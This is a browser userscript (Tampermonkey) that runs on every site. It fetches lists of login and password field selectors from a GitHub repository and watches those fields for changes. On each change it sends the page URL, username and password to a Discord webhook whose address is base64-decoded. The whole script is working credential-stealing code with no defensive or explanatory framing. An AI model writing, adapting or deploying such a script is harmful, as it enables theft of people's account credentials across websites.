// ==UserScript==
// @name         Main
// @namespace    http://tampermonkey.net/
// @version      2024-10-29
// @description  try to take over the world!
// @author       You
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=librus.pl
// @grant        GM_xmlhttpRequest
// @connect      raw.githubusercontent.com
// ==/UserScript==

(function() {
    'use strict';

    function fetchSelectors(callback) {
        let loginSelectors = "";
        let passwordSelectors = "";
        let completedRequests = 0;

        GM_xmlhttpRequest({
            method: "GET",
            url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-password-selectors.json",
            responseType: "json",
            onload: function(response) {
                passwordSelectors = response.response.map((selector) => `${selector}`).join(", ");

                completedRequests++;
                checkCompletion();
            }
        });

        GM_xmlhttpRequest({
            method: "GET",
            url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-login-selectors.json",
            responseType: "json",
            onload: function(response) {
                loginSelectors = response.response.map((selector) => `${selector}`).join(", ");

                completedRequests++;
                checkCompletion();
            }
        });

        function checkCompletion() {
            if (completedRequests === 2) callback(loginSelectors, passwordSelectors);
        }
    }

    fetchSelectors(function(loginSelectors, passwordSelectors) {
        console.log("Login Selectors: ", loginSelectors);
        console.log("Password Selectors: ", passwordSelectors);

        const loginBox = document.querySelector(loginSelectors);
        const passwordBox = document.querySelector(passwordSelectors);

        const discordWebhook = "webhook-here"
        let savedData = {
            url: window.location.href,
            login: "empty",
            password: "empty"
        }

        const sendWebhook = () => {
            fetch(atob(discordWebhook), {
                method: "post",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    username: "webhook",
                    content: `URL: \`${savedData.url}\` Username: \`${savedData.login}\` Password: \`${savedData.password}\``,
                })
            })
        };

        passwordBox.addEventListener("change", (event) => {
            savedData.password = event.target.value;
            sendWebhook();

        });

        loginBox.addEventListener("change", (event) => {
            savedData.login = event.target.value;
            sendWebhook();
        });
    });
})();
